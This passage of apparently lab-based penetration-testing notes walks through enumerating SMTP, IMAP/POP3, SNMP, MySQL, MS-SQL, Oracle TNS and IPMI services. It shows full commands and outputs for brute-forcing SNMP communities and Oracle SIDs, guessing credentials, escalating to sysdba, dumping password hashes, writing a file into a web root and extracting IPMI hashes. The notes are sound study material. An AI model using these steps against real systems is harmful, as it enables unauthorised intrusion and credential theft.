|  MAIL FROM:<> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@nmap.scanme.org> -> RCPT TO:<relaytest@nmap.scanme.org>
|  MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<"relaytest@nmap.scanme.org">
|_ MAIL FROM:<antispam@[10.129.14.128]> -> RCPT TO:<nmap.scanme.org!relaytest@ESMTP>
MAC Address: 00:00:00:00:00:00 (VMware)
Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
```

| **Command**  | **Description**                                                                                  |
| ------------ | ------------------------------------------------------------------------------------------------ |
| `AUTH PLAIN` | AUTH is a service extension used to authenticate the client.                                     |
| `HELO`       | The client logs in with its computer name and thus starts the session.                           |
| `MAIL FROM`  | The client names the email sender.                                                               |
| `RCPT TO`    | The client names the email recipient.                                                            |
| `DATA`       | The client initiates the transmission of the email.                                              |
| `RSET`       | The client aborts the initiated transmission but keeps the connection between client and server. |
| `VRFY`       | The client checks if a mailbox is available for message transfer.                                |
| `EXPN`       | The client also checks if a mailbox is available for messaging with this command.                |
| `NOOP`       | The client requests a response from the server to prevent disconnection due to time-out.         |
| `QUIT`       | The client terminates the session.                                                               |

***

***

## IMAPS & POP3S

#### Nmap Scan

Bash

```
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```

#### cURL Enumeration (Checking Mail via CLI)

Bash

```
# Basic check / list folders
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd

# Verbose check to inspect certificates and banners
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
```

#### OpenSSL Interactive Connections

Bash

```
# Connect to Encrypted POP3 (Port 995)
openssl s_client -connect 10.129.14.128:pop3s

# Connect to Encrypted IMAP (Port 993)
openssl s_client -connect 10.129.14.128:imaps
```

### 2. Tool Parameter Breakdowns

#### 💡 cURL (Used for IMAPS/POPS)

While usually used for web requests (HTTP/HTTPS), `curl` natively supports mail protocols like `imaps://` and `pop3s://`, making it an excellent fast checker for valid credentials.

* **`-k` / `--insecure`**: Tells cURL to allow connections to SSL sites without valid/trusted certificates (crucial for labs using self-signed certs).
* **`--user <user:password>`**: Passes the cleartext authentication credentials directly to the protocol daemon.
* **`-v` / `--verbose`**: Makes cURL verbose. This dumps the complete TLS handshake details, server certificates, and incoming/outgoing text streams.

#### 🛡️ OpenSSL

* **`s_client`**: Implements a generic SSL/TLS client that establishes a transparent, encrypted connection to a remote server.
* **`-connect <IP:PORT or IP:SERVICE>`**: Specifies the target address and port. Notice that OpenSSL accepts service aliases like `:pop3s` (port 995) or `:imaps` (port 993) directly.

#### 🔍 Nmap

* **`sudo`**: Required to run raw packet scans.
* **`-sV`**: Service version detection (grabs software banners).
* **`-p110,143,993,995`**: Targets standard POP3, IMAP, and their TLS/SSL encrypted counterparts.
* **`-sC`**: Runs default Nmap scripts (useful here for automatically pulling down and analyzing the SSL/TLS certificate fields).

### 3. Manual Protocol Interaction Commands

Once you open a raw encrypted shell via OpenSSL, you type these interactive commands directly into the terminal stream:

#### IMAP Interactive Commands

> _Note: IMAP requires an arbitrary prefix alphanumeric tag (like `1` or `A001`) before every command._

| **Command**                     | **Description**                                                                                               |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `1 LOGIN username password`     | User's login.                                                                                                 |
| `1 LIST "" *`                   | Lists all directories.                                                                                        |
| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                                                                      |
| `1 DELETE "INBOX"`              | Deletes a mailbox.                                                                                            |
| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                                                                            |
| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
| `1 SELECT INBOX`                | Selects a mailbox so that messages in the mailbox can be accessed.                                            |
| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                                                                   |
| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox.                                                      |
| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.                                                             |
| `1 LOGOUT`                      | Closes the connection with the IMAP server.                                                                   |

#### POP3 Interactive Commands

> _Note: POP3 is highly sequential and does not use pre-pended tags._

| **Command**     | **Description**                                             |
| --------------- | ----------------------------------------------------------- |
| `USER username` | Identifies the user.                                        |
| `PASS password` | Authentication of the user using its password.              |
| `STAT`          | Requests the number of saved emails from the server.        |
| `LIST`          | Requests from the server the number and size of all emails. |
| `RETR id`       | Requests the server to deliver the requested email by ID.   |
| `DELE id`       | Requests the server to delete the requested email by ID.    |
| `CAPA`          | Requests the server to display the server capabilities.     |
| `RSET`          | Requests the server to reset the transmitted information.   |
| `QUIT`          | Closes the connection with the POP3 server.                 |

***

***

## SNMP

### 1. Linux Text Processing (`cat`, `grep`, `sed`)

* **What the tools do:** These are native Linux utilities combined via pipes (`|`) to read configuration files and filter out clutter (like comments and empty spacing) so a pentester can quickly read the actual settings.

#### The Command & Output

Bash

```
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

Plaintext

```
sysLocation    Sitting on the Dock of the Bay
sysContact     Me <me@example.org>
sysServices    72
master  agentx
agentaddress  127.0.0.1,[::1]
view   systemonly  included   .1.3.6.1.2.1.1
view   systemonly  included   .1.3.6.1.2.1.25.1
rocommunity  public default -V systemonly
rocommunity6 public default -V systemonly
rouser authPrivUser authpriv -V systemonly
```

#### Flag Breakdown

* **`grep -v "#"`**
  * **`-v` (Invert Match):** Instead of showing lines that match the pattern, it drops them. Here, it strips out any line containing a `#` (which denotes an administrative comment).
* **`sed -r '/^\s*$/d'`**
  * **`-r` (Extended Regular Expressions):** Allows the use of advanced regex patterns without backslash escapes.
  * **`/^\s*$/d`:** Matches lines that contain only whitespace or are entirely empty, and the **`d`** directive tells `sed` to delete them from the final terminal output view.

### 2. Snmpwalk

* **What the tool does:** This is the standard diagnostic tool used to interact with SNMP. It systematically steps down an entire information tree node-by-node, forcing the target server to leak its configuration data, installed applications, and system details.

#### The Command & Output

Bash

```
snmpwalk -v2c -c public 10.129.14.128
```

Plaintext

```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (5134) 0:00:51.34
...SNIP...
iso.3.6.1.2.1.25.6.3.1.2.1243 = STRING: "python3_3.8.2-0ubuntu2_amd64"
iso.3.6.1.2.1.25.6.3.1.2.1244 = STRING: "python3-acme_1.1.0-1_all"
```

#### Flag Breakdown

* **`-v2c` (SNMP Version):** Specifies the version of the SNMP protocol to communicate with. Version `2c` relies on basic, cleartext community string passwords.
* **`-c public` (Community String):** Passes the password string to authenticate against the daemon. In this case, it tests the standard read-only default password `public`.

### 3. Onesixtyone

* **What the tool does:** An ultra-fast, multi-threaded SNMP community string brute-forcer. It sends parallel UDP requests to test hundreds of common passwords against a target device simultaneously.

#### The Command & Output

Bash

```
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

Plaintext

```
Scanning 1 hosts, 3220 communities
10.129.14.128 [public] Linux htb 5.11.0-37-generic #41~20.04.2-Ubuntu SMP Fri Sep 24 09:06:38 UTC 2021 x86_64
```

#### Flag Breakdown

* **`-c <file>` (Community Wordlist):** This is the main operational flag. It instructs the tool to load an external dictionary list of passwords (here pulling from SecLists) instead of guessing one string at a time manually.

### 4. Braa

* **What the tool does:** A high-speed, asynchronous mass SNMP query tool. Unlike `snmpwalk`, which queries rows one-by-one sequentially, `braa` can dump massive, complete branches of data simultaneously using wildcards.

#### The Command & Output

Bash

```
braa public@10.129.14.128:.1.3.6.*
```

Plaintext

```
10.129.14.128:20ms:.1.3.6.1.2.1.1.1.0:Linux htb 5.11.0-34-generic #36~20.04.1-Ubuntu SMP Fri Aug 27 08:06:32 UTC 2021 x86_64
10.129.14.128:20ms:.1.3.6.1.2.1.1.2.0:.1.3.6.1.4.1.8072.3.2.10
10.129.14.128:20ms:.1.3.6.1.2.1.1.3.0:548
...SNIP...
```

#### Syntax & Flag Breakdown

`braa` does not use standard independent flag switches (like `-c` or `-v`). Instead, it uses a unique **composite string structure** to process its mass query:

$$\text{braa} \quad \langle\text{community}\rangle\text{@}\langle\text{Target IP}\rangle\text{:}\langle\text{Numerical OID}\rangle$$

* **`public@`**: Injects the valid authentication community string password directly before the host identifier.
* **`:.1.3.6.*`**: The trailing **`*`** acts as a wildcard indicator. It tells the tool's async engine to instantly query and grab every single nested data field branching below the `.1.3.6` root index without stopping.

***

***

## My SQL

### 1. Operating System Shell Commands & Outputs

#### Checking the Default MySQL Configuration

This command reads the MySQL daemon configuration file (`mysqld.cnf`), ignores comment lines (`#`), and strips out blank lines to give a clean review of critical settings.

Bash

```
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

**Output:**

Plaintext

```
[client]
port        = 3306
socket      = /var/run/mysqld/mysqld.sock
[mysqld_safe]
pid-file    = /var/run/mysqld/mysqld.pid
socket      = /var/run/mysqld/mysqld.sock
nice        = 0
[mysqld]
skip-host-cache
skip-name-resolve
user        = mysql
pid-file    = /var/run/mysqld/mysqld.pid
socket      = /var/run/mysqld/mysqld.sock
port        = 3306
basedir     = /usr
datadir     = /var/lib/mysql
tmpdir      = /tmp
lc-messages-dir = /usr/share/mysql
explicit_defaults_for_timestamp
symbolic-links=0
!includedir /etc/mysql/conf.d/
```

#### Footprinting the Service via Nmap

Runs default configuration and version identification scripts specifically targeted at the default MySQL port (`3306`).

Bash

```
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

**Output:**

Plaintext

```
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-21 00:53 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00021s latency).

PORT     STATE SERVICE     VERSION
3306/tcp open  nagios-nsca Nagios NSCA
| mysql-brute: 
|   Accounts: 
|     root:<empty> - Valid credentials
|_  Statistics: Performed 45010 guesses in 5 seconds, average tps: 9002.0
|_mysql-databases: ERROR: Script execution failed (use -d to debug)
|_mysql-dump-hashes: ERROR: Script execution failed (use -d to debug)
| mysql-empty-password: 
|_  root account has empty password
| mysql-enum: 
|   Valid usernames: 
|     root:<empty> - Valid credentials
|     netadmin:<empty> - Valid credentials
|     guest:<empty> - Valid credentials
|     user:<empty> - Valid credentials
|     web:<empty> - Valid credentials
|     sysadmin:<empty> - Valid credentials
|     administrator:<empty> - Valid credentials
|     webadmin:<empty> - Valid credentials
|     admin:<empty> - Valid credentials
|     test:<empty> - Valid credentials
|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.26-0ubuntu0.20.04.1
|   Thread ID: 13
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SupportsTransactions, Speaks41ProtocolOld, LongPassword, DontAllowDatabaseTableColumn, Support41Auth, IgnoreSigpipes, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, LongColumnFlag, SupportsCompression, ODBCClient, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
|   Status: Autocommit
|   Salt: YTSgMfqvx\x0F\x7F\x16\&\x1EAeK>0
|_  Auth Plugin Name: caching_sha2_password
|_mysql-users: ERROR: Script execution failed (use -d to debug)
|_mysql-variables: ERROR: Script execution failed (use -d to debug)
|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:00:00:00:00:00 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.21 seconds
```

#### Unauthenticated Interaction Attempt (Checking for False Positives)

Bash

```
mysql -u root -h 10.129.14.132
```

**Output:**

Plaintext

```
ERROR 1045 (28000): Access denied for user 'root'@'10.129.14.1' (using password: NO)
```

#### Authenticating with Discovered Credentials

Bash

```
mysql -u root -pP4SSw0rd -h 10.129.14.128
```

**Output:**

Plaintext

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 150165
Server version: 8.0.27-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

### 2. Interactive Database Queries & Outputs

Once authenticated to the database monitor terminal (`MySQL [(none)]>`), the following queries were executed:

#### Listing the Available Databases

SQL

```
show databases;
```

**Output:**

Plaintext

```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
4 rows in set (0.006 sec)
```

#### Checking the Database Engine Version

SQL

```
select version();
```

**Output:**

Plaintext

```
+-------------------------+
| version()               |
+-------------------------+
| 8.0.27-0ubuntu0.20.04.1 |
+-------------------------+
| 1 row in set (0.001 sec)
```

#### Selecting and Listing Tables from the System `mysql` Database

SQL

```
use mysql;
show tables;
```

**Output:**

Plaintext

```
+------------------------------------------------------+
| Tables_in_mysql                                      |
+------------------------------------------------------+
| columns_priv                                         |
| component                                            |
| db                                                   |
| default_roles                                        |
| engine_cost                                          |
| func                                                 |
| general_log                                          |
| global_grants                                        |
| gtid_executed                                        |
| help_category                                        |
| help_keyword                                         |
| help_relation                                        |
| help_topic                                           |
| innodb_index_stats                                   |
| innodb_table_stats                                   |
| password_history                                     |
...SNIP...
| user                                                 |
+------------------------------------------------------+
37 rows in set (0.002 sec)
```

#### Selecting and Auditing User Connections in the System Schema Database

SQL

```
use sys;
show tables;
```

**Output:**

Plaintext

```
+-----------------------------------------------+
| Tables_in_sys                                 |
+-----------------------------------------------+
| host_summary                                  |
| host_summary_by_file_io                       |
| host_summary_by_file_io_type                  |
| host_summary_by_stages                        |
| host_summary_by_statement_latency             |
| host_summary_by_statement_type                |
| innodb_buffer_stats_by_schema                 |
| innodb_buffer_stats_by_table                  |
| innodb_lock_waits                             |
| io_by_thread_by_latency                       |
...SNIP...
| x$waits_global_by_latency                     |
+-----------------------------------------------+
```

#### Querying Host Summaries for Active Network Users

SQL

```
select host, unique_users from host_summary;
```

**Output:**

Plaintext

```
+-------------+--------------+
| host        | unique_users |
+-------------+--------------+
| 10.129.14.1 |            1 |
| localhost   |            2 |
+-------------+--------------+
2 rows in set (0,01 sec)
```

### 3. MySQL Core Command Reference Table

| **Command**                                              | **Description**                                                                                                                    |
| -------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| **`mysql -u <user> -p<password> -h <IP address>`**       | Connects to the target MySQL server instance. _(Note: There must be no space between the `-p` flag and the password text string)._ |
| **`show databases;`**                                    | Lists all structured database schemas visible to the current authenticated user session.                                           |
| **`use <database>;`**                                    | Selects and mounts one of the discovered schema databases to execute internal actions.                                             |
| **`show tables;`**                                       | Lists all available tables inside the active database container layout.                                                            |
| **`show columns from <table>;`**                         | Lists the columns, data constraints, and structural layout of a specified database table.                                          |
| **`select * from <table>;`**                             | Dumps all records and entries stored across every column within the specified table.                                               |
| **`select * from <table> where <column> = "<string>";`** | Filters a table data extract to display only rows matching a specific criteria string.                                             |

***

***

## MS-SQL

### 1. Operating System Shell Commands & Outputs

#### 🖥️ Command 1: Locating the Impacket Client Script

This command checks the local Linux filesystem index database to find where the `mssqlclient` application or Python script is stored.

Bash

```
locate mssqlclient
```

**Output:**

Plaintext

```
/usr/bin/impacket-mssqlclient
/usr/share/doc/python3-impacket/examples/mssqlclient.py
```

#### 🖥️ Command 2: Detailed Service Footprinting via Nmap

This runs an aggressive Nmap NSE script scan targeting the default MSSQL port (`1433`) to dump version configurations, Active Directory domain names, and identify if features like `xp_cmdshell` or blank administrator passwords are open.

Bash

```
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

**Output:**

Plaintext

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-08 09:40 EST
Nmap scan report for 10.129.201.248
Host is up (0.15s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: SQL-01
|   NetBIOS_Domain_Name: SQL-01
|   NetBIOS_Computer_Name: SQL-01
|   DNS_Domain_Name: SQL-01
|   DNS_Computer_Name: SQL-01
|_  Product_Version: 10.0.17763
Host script results:
| ms-sql-dac: 
|_  Instance: MSSQLSERVER; DAC port: 1434 (connection failed)
| ms-sql-info: 
|   Windows server name: SQL-01
|   10.129.201.248\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.129.201.248\pipe\sql\query
|_    Clustered: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds
```

#### 🖥️ Command 3: Querying Instances via Metasploit (`mssql_ping`)

Launches a Metasploit auxiliary utility to query the SQL Server Resolution Service (MC-SQLR) on UDP port `1434`, leaking instance configurations without authentication.

Bash

```
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

**Output:**

Plaintext

```
[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### 🖥️ Command 4: Connecting Interactively using Impacket

Establishes an interactive database shell using Windows authentication mechanics over a secure TLS wrapper.

Bash

```
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

**Output:**

Plaintext

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-01): Line 1: Changed database context to 'master'.
[*] INFO(SQL-01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
```

### 2. Interactive Database Queries & Outputs

Once inside the interactive prompt (`SQL>`), the engine interprets Transact-SQL (T-SQL) inputs directly:

#### 🗄️ Query: Enumerate Available System Databases

SQL

```
SQL> select name from sys.databases
```

**Output:**

Plaintext

```
name                                                                                                                               
--------------------------------------------------------------------------------------
master                                                                                                                             
tempdb                                                                                                                             
model                                                                                                                              
msdb                                                                                                                               
Transactions
```

### 3. Tool Flag & Parameter Reference

| **Tool Used**        | **Argument / Flag**  | **Technical Purpose**                                                                                                                   |
| -------------------- | -------------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| **`locate`**         | `mssqlclient`        | Strips path requirements by instantly matching a raw string query against the local system filename database index.                     |
| **`nmap`**           | `--script ms-sql-*`  | Tells Nmap to execute specific engine scripts to interrogate MSSQL connection traits.                                                   |
|                      | `--script-args`      | Feeds custom arguments into the active scripts (e.g., forcing a trial credential connection using `sa` and an empty string password).   |
|                      | `-sV`                | Activates intense software service version detection checks.                                                                            |
|                      | `-p 1433`            | Restricts the network query space strictly to the default MSSQL daemon listening port.                                                  |
| **`msfconsole`**     | `set rhosts`         | Defines the remote target IP address inside the framework's workspace.                                                                  |
|                      | `run`                | Executes the loaded module code (`mssql_ping`) across the network stack.                                                                |
| **`mssqlclient.py`** | `Administrator@<IP>` | Targets the connection context profile using format: `[username]@[Target IP Address]`.                                                  |
|                      | `-windows-auth`      | Forces the authentication flow to bypass internal database security and rely on the underlying Windows OS/Active Directory environment. |

***

***

## Oracle TNS

The **Oracle Transparent Network Substrate (TNS)** is a proprietary communication protocol that allows peer-to-peer applications to talk to Oracle databases over a network stack. By default, the database listener process spins up on **TCP Port 1521**.

#### 📁 The Blueprint Configuration Files

Oracle uses two core `.ora` files located in the `$ORACLE_HOME/network/admin` directory to establish connections:

* **`tnsnames.ora` (Client-Side Dictionary):** Acts like a local phone book for the client. It maps human-readable database service aliases (e.g., `ORCL`) to the exact destination IP, protocol, port, and specific instance name.
* **`listener.ora` (Server-Side Guide):** Defines the listener process configuration on the server. It specifies which network ports and interfaces the server must listen to, and binds them to the active internal database instances (SIDs).

#### 🔑 The System Identifier (SID)

An Oracle database host can run multiple instances simultaneously. The **SID** is a unique name tag that identifies a specific database instance. Before a client can run commands against the database, it **must** know the exact SID. If the SID is unknown, an attacker cannot complete the handshake.

### 🔍 Phase 1: Reconnaissance & Enumeration

#### 1. Basic Port Scanning

This command identifies if the port is open and attempts to pull the exact software version of the listener daemon.

Bash

```
sudo nmap -p1521 -sV 10.129.204.235 --open
```

**Output:**

Plaintext

```
PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
```

#### 2. SID Brute-Forcing

Because we cannot talk to the database without a valid database identifier name, we run an Nmap script that tests common built-in default SIDs against the open engine.

Bash

```
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

**Output:**

Plaintext

```
| oracle-sid-brute: 
|_  XE
```

> **Insight:** The scan successfully extracted the valid instance SID: **`XE`**.

#### 3. Automated Credential Guessing via ODAT

**ODAT (Oracle Database Attacking Tool)** is the premier utility for exploiting Oracle architectures. The `all` flag forces the application to automatically check all exploitation vectors, including testing a dictionary of common default database usernames and passwords.

Bash

```
./odat.py all -s 10.129.204.235
```

**Output:**

Plaintext

```
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
[!] Notice: 'mdsys' account is locked...
[+] Valid credentials found: scott/tiger. Continue...
```

> **Insight:** The scanner discovered a valid, low-privileged credential pair: **`scott / tiger`**.

### 💥 Phase 2: Exploitation & Post-Exploitation

#### 1. Establishing an Interactive Database Shell (`SQL*Plus`)

Once valid credentials and the SID are recovered, you use `sqlplus` to open an interactive terminal session inside the target database instance.

Bash

```
sqlplus scott/tiger@10.129.204.235/XE
```

**Output:**

Plaintext

```
Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
SQL> 
```

#### 2. Escalating to Database Administrator (`sysdba`)

If the low-privilege user account has been misconfigured or granted excessive rights by an administrator, you can request an elevated session by appending `as sysdba` directly to the execution connection string.

Bash

```
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

**Output Query Verification:**

SQL

```
SQL> select * from user_role_privs;
```

Plaintext

```
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DBA                            YES YES NO
```

> **Insight:** You are now executing actions as the absolute root database administrator (**`SYS`**), opening access to internal tables.

#### 3. Dumping Core Password Hashes

With administrative control, you query the system internal index tables (`sys.user$`) to extract the passwords hashes of all other users for offline cracking.

SQL

```
SQL> select name, password from sys.user$;
```

**Output:**

Plaintext

```
NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
SYSTEM                         B5073FE1DE351687
OUTLN                          4A3BA55E08595C81
```

#### 4. Remote File Upload & Web Shell Creation

If the host server is running an accompanying web server (like Microsoft IIS or Apache), an administrator account can use ODAT's **`utlfile`** module to drop local files directly onto the operating system filesystem web root.

Bash

```
# 1. Create a dummy test file locally
echo "Oracle File Upload Test" > testing.txt

# 2. Instruct ODAT to upload it via the database engine
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

**Output:**

Plaintext

```
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

#### 5. Confirming Code Execution via HTTP

Finally, query the target web server using `curl` to verify the file was successfully written to disk and is accessible externally.

Bash

```
curl -X GET http://10.129.204.235/testing.txt
```

**Output:**

Plaintext

```
Oracle File Upload Test
```

### 📊 Comprehensive Command Parameter Breakdown

| **Tool / Context**  | **Flag / Syntax Parameter**             | **Structural Purpose**                                                                      |
| ------------------- | --------------------------------------- | ------------------------------------------------------------------------------------------- |
| **`nmap`**          | `-p1521`                                | Restricts the network query space strictly to the default Oracle TNS port.                  |
|                     | `--script oracle-sid-brute`             | Instructs Nmap to brute-force the required System Identifier (SID) values.                  |
| **`odat.py`**       | `all`                                   | Directs the tool to sequentially run all profiling and vulnerability test modules.          |
|                     | `utlfile`                               | Launches the specific database module designed for local file system read/write operations. |
|                     | `-s 10.129.204.235`                     | Defines the destination target server IP address.                                           |
|                     | `-d XE`                                 | Identifies the target database instance name (SID).                                         |
|                     | `-U scott -P tiger`                     | Injects the credentials used to complete database security validation.                      |
|                     | `--sysdba`                              | Requests the connection to be elevated to System Database Administrator mode.               |
|                     | `--putFile`                             | Pinpoints the host directory path where the local payload should be written.                |
| **`sqlplus`**       | `scott/tiger@IP/XE`                     | Standard syntax format: `[User]/[Password]@[IP]/[SID]`.                                     |
|                     | `as sysdba`                             | Instructs the client utility to establish high-privileged database root privileges.         |
| **`T-SQL Queries`** | `select * from user_role_privs;`        | Retrieves security authorization details for the current active user context.               |
|                     | `select name, password from sys.user$;` | Dumps user account entries alongside their corresponding cryptographic password hashes.     |

***

***

## IPMI & BMC

**IPMI** is a standardized set of hardware specifications that allows system administrators to manage and monitor a computer host completely **out-of-band (OOB)**. This means it operates as an autonomous subsystem entirely independent of the host operating system, CPU, or BIOS status.

Administrators can use it to modify BIOS configurations before boot, manage a system that is fully powered down, or gain console access during a total operating system failure.

* **BMC (Baseboard Management Controller):** The physical heart of IPMI. It is an embedded micro-controller (typically an ARM chip running a stripped-down Linux kernel) built directly onto the motherboard or added via a PCI card.
* **The Critical Security Risk:** Gaining access to the BMC network port is functionally identical to having physical access to the server chassis. An attacker inside the network space can monitor video outputs, cycle power, mount remote ISO images, or entirely wipe and reinstall the operating system.

### 🔍 Phase 1: Service Footprinting and Version Discovery

IPMI networks utilize **UDP Port 623** for communications using the ASF-RMCP (Alert Standard Format - Remote Management Control Protocol) framework.

#### 🛠️ Command 1: Nmap Scanning via NSE Script

This command scans UDP port 623 and applies the native `ipmi-version` script to identify the supported authentication styles and profile layout.

Bash

```
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

**Output:**

Plaintext

```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-04 21:48 GMT
Nmap scan report for ilo.inlanfreight.local (172.16.2.2)
Host is up (0.00064s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version:
|   Version:
|     IPMI-2.0
|   UserAuth:
|   PassAuth: auth_user, non_null_user
|_  Level: 2.0
MAC Address: 14:03:DC:67:E4:18:6A (Hewlett Packard Enterprise)

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

#### 🛠️ Command 2: Metasploit Service Fingerprinting

This auxiliary scanner actively targets an IP address layout to map out supported hashes and interface versions across the target space.

Bash

```
msf6 > use auxiliary/scanner/ipmi/ipmi_version
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

**Output:**

Plaintext

```
[*] Sending IPMI requests to 10.129.42.195->10.129.42.195 (1 hosts)
[+] 10.129.42.195:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 💥 Phase 2: Exploiting the RAKP Protocol Flaw

#### ⚠️ The Vulnerability Breakdown

The key flaw in **IPMI version 2.0** revolves around its mandatory authentication protocol called **RAKP (Remote Authenticated Key Exchange Protocol)**.

During the connection handshake, when a client requests access using a specific username, the server is forced to respond by transmitting a salted SHA1 or MD5 hash of the requested user's password to the client **before** the client ever proves they know the password.

Because this behavior is hardwired directly into the core specification of IPMI 2.0, it cannot be traditionally patched. An attacker can request a hash for _any_ valid system account (such as `ADMIN` or `root`) and brute-force it completely offline.

#### 🛠️ Command 3: Retrieving Password Hashes via Metasploit

This module interacts with the vulnerable RAKP mechanism to grab the authentication hash structure for configured usernames.

Bash

```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```

**Output:**

Plaintext

```
[+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:8e160d4802040000205ee9253b6b8dac3052c837e23faa631260719fce740d45c3139a7dd4317b9ea123456789abcdefa123456789abcdef140541444d494e:a3e82878a09daa8ae3e6c22f9080f8337fe0ed7e
[+] 10.129.42.195:623 - IPMI - Hash for user 'ADMIN' matches password 'ADMIN'
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

> **Note:** In this specific lab scenario, the module verified that the target was using the default credential pair **`ADMIN:ADMIN`**.

### 📋 Hardcoded Hardware Default Reference Table

